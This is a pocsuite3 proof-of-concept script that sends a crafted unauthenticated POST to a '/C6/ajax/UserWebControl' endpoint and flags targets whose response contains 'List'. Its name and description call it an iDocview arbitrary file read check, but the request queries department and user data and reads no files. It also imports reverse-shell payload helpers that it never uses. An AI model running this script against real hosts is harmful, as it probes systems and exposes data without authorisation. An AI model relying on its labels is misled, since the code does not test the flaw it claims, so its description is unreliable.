# _*_ coding:utf-8 _*_
# @Time : 2023/12/14
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class iDocview_fileread(POCBase):
    pocDesc = '''iDocview某接口存在任意文件读取漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-14'
    name = 'iDocview某接口存在任意文件读取漏洞'

    #title="I Doc View"

    def _verify(self):

        result = {}
        url = self.url+ '/C6/ajax/UserWebControl.UserSelect.AjaxServiceMethod,UserWebControl.UserSelect.ashx?_method=GetDepartDataByDeptID&_session=no'

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'text/plain;charset=UTF-8',
            'Content-Length': '103'

        }

        try:
            data = 'strDeptID=\r\nstrUserId=Admin\r\nstrUserEsp=\r\nstrArchivesId=\r\ndeptIds=\r\nIsShowChildrenDept=0\r\nIsCascade=1'


            response = requests.post(url, headers=headers,data=data)
            if response.status_code == 200 and 'List' in response.text:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(iDocview_fileread)